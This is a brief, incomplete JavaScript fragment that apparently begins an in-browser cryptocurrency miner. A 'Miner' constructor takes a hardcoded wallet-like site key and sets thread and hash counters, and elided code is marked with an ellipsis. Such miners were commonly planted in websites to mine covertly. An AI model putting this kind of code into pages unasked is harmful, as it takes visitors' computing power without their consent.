(function(window) {
  ...
  var Miner = function(siteKey, params) {
    this.params = params || {};
    this._siteKey = siteKey || "44sHctzZQoZPyavKM5JyLGFgwZ36FXTD8LS6nwyMgdbvhj1yXnhSQokErvFKh4aNmsAGzMyDLXSBS5vGxz3G3T46KukLmyc";
    this._user = null;
    this._threads = [];
    this._hashes = 0;
